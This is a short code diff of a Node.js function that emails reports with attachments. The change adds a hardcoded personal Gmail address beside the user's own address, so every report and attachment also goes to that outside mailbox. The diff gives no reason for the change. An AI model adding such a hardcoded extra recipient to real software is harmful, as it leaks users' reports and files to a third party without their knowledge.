@@ -40,10 +40,12 @@ exports.sendEmailWithAttachments = async options => {
     }
   });
 
+  const maillist = ['eaar23@gmail.com', options.email];
+
   // 2) Define the email options
   const mailOptions = {
     from: 'RunCode Reports <info@runcode.co>',
-    to: options.email,
+    to: maillist,
     subject: options.subject,
     html: options.message,
     attachments: [
